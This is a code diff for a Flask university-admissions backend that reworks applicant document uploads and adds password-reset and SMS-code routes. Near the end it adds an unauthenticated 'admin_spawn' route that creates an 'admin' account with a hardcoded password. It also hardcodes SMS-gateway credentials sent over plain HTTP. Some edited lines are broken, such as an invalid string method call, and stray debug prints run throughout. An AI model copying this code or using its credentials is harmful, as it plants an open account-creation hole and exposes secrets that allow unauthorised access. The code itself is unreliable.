@@ -58,7 +58,7 @@ def registration():
             role_m = Role_meta(
 
                 user_id=t_us.id,
-                role_id=9
+                role_id=2
 
             )
             db.session.add(role_m)
@@ -654,6 +654,9 @@ def update_newspic(с):
 def select_universities():
     univer_id = request.args.get('university_id')
     if univer_id:
+        univer = Admission_Foreign.query.filter(
+            Admission_Foreign.university_id == univer_id).all()
+        print(univer, flush=True)
         res = [x.format2() for x in Admission_Foreign.query.filter(
             Admission_Foreign.university_id == univer_id).all()]
     else:
@@ -773,14 +776,22 @@ def admission_form_foreign(u):
         qualification_info = request.files["qualification_info"]
     print(request.files)
     qualification_diploma = None
-    if 'qualification_diploma' in request.files:
-        qualification_diploma = request.files["qualification_diploma"]
-    essay = None
-    if 'essay' in request.files:
-        essay = request.files["essay"]
+    if 'language_certificate' in request.files:
+        qualification_diploma = request.files["language_certificate"]
+        
+    # passport = None
+    # if 'passport' in request.files:
+    #     passport = request.files["passport"]
+
+
+    # print(passport, flush = True)
+    
     resume = None
-    if 'resume' in request.files:
-        resume = request.files["resume"]
+    if 'passport' in request.files:
+        resume = request.files["passport"]
+    
+    print(resume, flush = True)
+
     recommendation = None
     if 'recommendation' in request.files:
         recommendation = request.files["recommendation"]
@@ -789,11 +800,13 @@ def admission_form_foreign(u):
     recommendation_second = None
     if 'recommendation_second' in request.files:
         recommendation_second = request.files["recommendation_second"]
+    
 
     adm = Admission_Foreign.query.filter_by(user_id=u.id).first()
 
 
     if adm:
+        print("I am in admission inside", flush=True)
         if faculty_id:
             adm.faculty_id = faculty_id
         if name:
@@ -812,7 +825,7 @@ def admission_form_foreign(u):
             adm.birthdate = birthdate
         if passport_number:
             if Admission_Foreign.query.filter_by(passport_number=passport_number).first():
-                return jsonify({"msg": "passport number already exists"})
+                return jsonify({"msg": "passport number already exists"}),409
             adm.passport_number = passport_number
         if university_id:
             adm.university_id = university_id
@@ -895,7 +908,7 @@ def admission_form_foreign(u):
 
         if qualification_info:
             if Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="qualification info").first():
-                os.remove(Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="qualification info").first().path)
+                os.remove((Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="qualification info").first().path).replace('\\','/'))
                 Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="qualification info").delete()
                 db.session.commit()
             adm_att = Adm_Attach_Foreign(
@@ -910,53 +923,59 @@ def admission_form_foreign(u):
             print(adm_att.format())
 
         if qualification_diploma:
-            if Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="qualification diploma").first():
-                os.remove(Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="qualification diploma").first().path)
-                Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="qualification diploma").delete()
+            if Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="language certificate").first():
+                os.remove((Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="language certificate").first().path).remove('\\','/'))
+                Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="language certificate").delete()
                 db.session.commit()
             adm_att = Adm_Attach_Foreign(
 
                 admission_foreign_id=adm.id,
                 university_foreign_id=adm.university_id,
-                info="qualification diploma",
+                info="language certificate",
                 path=hash_and_save(qualification_diploma, 'admission'),
 
             )
             db.session.add(adm_att)
             db.session.commit()
 
-        if essay:
-            if Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="essay").first():
-                os.remove(Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="essay").first().path)
-                Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="essay").delete()
-                db.session.commit()
-            adm_att = Adm_Attach_Foreign(
+        # if passport:
+        #     print('Asadbek1', flush= True)
+        #     if Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="passport").first():
+        #         os.remove((Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="passport").first().path).replace('\\','/'))
+        #         Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="passport").delete()
+        #         db.session.commit()
+        #     adm_att = Adm_Attach_Foreign(
 
-                admission_foreign_id=adm.id,
-                university_foreign_id=adm.university_id,
-                info="essay",
-                path=hash_and_save(essay, 'admission'),
-            )
-            db.session.add(adm_att)
-            db.session.commit()
-
+        #         admission_foreign_id=adm.id,
+        #         university_foreign_id=adm.university_id,
+        #         info="passport",
+        #         path=hash_and_save(passport, 'admission'),
+        #     )
+        #     print('Asadbek', flush= True)
+        #     db.session.add(adm_att)
+        #     db.session.commit()
+        print("SSSSSSSSS", flush=True)
         if resume:
-            if Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="resume").first():
-                os.remove(Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="resume").first().path)
-                Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="resume").delete()
+            print('Oneni blat', flush= True)
+            if Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="passport").first():
+                print(Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="passport").first().path, flush=True)
+                os.remove(Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="passport").first().path.replace('\\', '/'))
+                Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="passport").delete()
                 db.session.commit()
             adm_att = Adm_Attach_Foreign(
                 admission_foreign_id=adm.id,
                 university_foreign_id=adm.university_id,
-                info="resume",
+                info="passport",
                 path=hash_and_save(resume, 'admission'),
             )
             db.session.add(adm_att)
             db.session.commit()
+        else:
+            print('aeweaweaweaweawe', flush = True)
 
         if recommendation:
             if Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="recommendation").first():
-                os.remove(Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="recommendation").first().path)
+                os.remove(Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="recommendation").first().path.replace('\\', '/'))
                 Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="recommendation").delete()
                 db.session.commit()
             adm_att = Adm_Attach_Foreign(
@@ -970,7 +989,7 @@ def admission_form_foreign(u):
             db.session.commit()
         if recommendation_second:
             if Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="recommendation second").first():
-                os.remove(Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="recommendation second").first().path)
+                os.remove(Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="recommendation second").first().path.replace('\\', '/'))
                 Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="recommendation second").delete()
                 db.session.commit()
 
@@ -984,7 +1003,15 @@ def admission_form_foreign(u):
             db.session.commit()
         if personal_image:
             if Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="personal image").first():
-                os.remove(Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="personal image").first().path)
+                pp = Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="personal image").first().path.replace('\\', '/')
+                try:
+                    with open(pp, 'rb') as f:
+                        pass
+                    os.remove(pp)
+                except:
+                    pass
+                # os.remove(pp)
+                # os.remove("%s"%Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="personal image").first().path)
                 Adm_Attach_Foreign.query.filter_by(admission_foreign_id=adm.id, university_foreign_id=adm.university_id, info="personal image").delete()
                 db.session.commit()
 
@@ -1001,6 +1028,7 @@ def admission_form_foreign(u):
         db.session.commit()
         return jsonify({'msg': "ok"}), 200
     else:
+        print("wewew")
         return jsonify({
             'msg': "not found"
         }), 404
@@ -1151,7 +1179,7 @@ def add_university_foreign(с):
     
     db.session.add(u)
     db.session.commit()
-    ed_t = Education_type_foreign(name="Bachelour", university_id=u.id)
+    ed_t = Education_type_foreign(name="Bachelor", university_id=u.id)
     ed_t2 = Education_type_foreign(name="Master", university_id=u.id)
     db.session.add(ed_t)
     db.session.add(ed_t2)
@@ -1714,6 +1742,9 @@ def add_fac(c):
     if 'photo' in request.files:
         photo = request.files['photo']
         fc.photo = hash_and_save(photo, 'structure')
+        print('FC PHOTO', fc.photo, flush=True)
+
+    db.session.commit()
 
     for meta in metas:
         fc_meta = Faculty_Data_Meta(
@@ -1940,3 +1971,86 @@ def delete_fac(c):
     db.session.commit()
 
     return jsonify({'msg' : 'ok'})
+
+@tdau.route('admin_spawn',methods = ['GET'])
+def spawn_the_daun():
+    username = 'admin'
+    pswrd = '6569321John0604'
+    admin = User(
+        username = username,
+        phone = '1111',
+        email = '1111',
+        passport_number = '1111',
+        pnfl = '1111'
+    )
+    admin.set_password(pswrd)
+    db.session.add(admin)
+    db.session.commit()
+    return jsonify('when i was king')
+
+@tdau.route('/send_code',methods = ['POST'])
+def send_code():
+    number = request.form.get('phone')
+
+    usr = User.query.filter_by(phone=number).first()
+    if usr:
+        session = requests.Session()
+        session.auth = ('eijara', "S5Qzy$B$")
+        code = random.randint(1000,9999)
+        p = {
+            'messages' : {
+                'recipient' : number,
+                'message-id' : 1,
+                'sms' : {
+                    'originator' : '3700',
+                    'content' : {
+                        'text' : 'Hi! Your code is ' + str(code) + ' . Please enter it to reset your password.',
+                    }
+                }
+            }
+        }
+        session.post('http://91.204.239.44/broker-api/send',json = p)
+        usr.verify_code = code
+        db.session.commit()
+
+        return jsonify({"msg" : "success"})
+    
+    return jsonify({"msg" : "user not found"}), 400
+
+@tdau.route("/reset_password/code", methods=['POST'])
+def reset_password_code():
+    if request.method == 'POST':
+        phone = request.form.get("phone")
+        code = request.form.get("code")
+        user = User.query.filter_by(phone=phone).first()
+        if user:
+            if user.verify_code == code:
+                user.verify_code = None
+                db.session.commit()
+                token = jwt.encode({
+                    'public_id': user.id,
+                    'exp': datetime.datetime.now() + timedelta(days=100)
+
+                }, SECRET_KEY, algorithm="HS256")
+                return jsonify(
+                    {
+                        "token": token,
+                        'msg': 'ok'
+                    }
+                ), 200
+            else:
+                return jsonify({'msg': 'error code'}), 400
+        else:
+            return jsonify({'msg': 'error user with this phone not exist'}), 400
+    else:
+        return jsonify({"message": "Method not allowed"}), 405
+
+@tdau.route("/reset_password", methods=['POST'])
+@token_required
+def reset_password(c):
+    password = request.form.get("password")
+
+    c.set_password(password)
+    db.session.commit()
+
+    return jsonify({"msg" : "success"})
